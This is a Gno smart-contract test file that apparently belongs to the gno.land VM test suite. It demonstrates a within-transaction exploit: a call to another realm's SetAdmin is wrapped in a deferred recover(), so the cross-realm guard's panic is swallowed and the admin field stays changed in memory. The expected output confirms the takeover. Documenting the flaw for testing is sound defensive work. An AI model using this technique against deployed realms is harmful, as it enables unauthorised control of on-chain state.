// PKGPATH: gno.land/r/crossrealm
package crossrealm

// Demonstrates within-tx admin corruption via assign+recover.
//
// The attacker corrupts admin to their own realm address.
// The cross-realm guard fires but recover() swallows it, while
// the in-memory mutation persists for the rest of the tx.
//
// NOTE: this corruption does NOT persist across transactions
// (verified by txtar test crossrealm_assign_recover.txtar),
// but within-tx exploitation is still dangerous: the attacker
// can read wrong state and act on it before the tx ends.

import (
	"chain/runtime"

	"gno.land/r/tests/vm/crossrealm_d"
)

func main() {
	adminBefore := crossrealm_d.GetAdmin(cross)
	println("admin before:", adminBefore)

	// Corrupt admin to this realm's address via assign+recover.
	myAddr := runtime.CurrentRealm().Address()
	func() {
		defer func() {
			r := recover()
			if r != nil {
				println("panic caught:", r.(string))
			}
		}()
		crossrealm_d.SetAdmin(myAddr)
	}()

	// Verify admin is now this realm's address (within-tx).
	adminAfter := crossrealm_d.GetAdmin(cross)
	println("admin after:", adminAfter)
	println("admin matches attacker:", adminAfter == myAddr)

	println("realm state corrupted within this tx")
}

// Output:
// admin before:
// panic caught: cannot modify external-realm or non-realm object
// admin after: g1h2y7mn4d8w5ed08kqt8sdd7tp4j96eahyn6yan
// admin matches attacker: true
// realm state corrupted within this tx
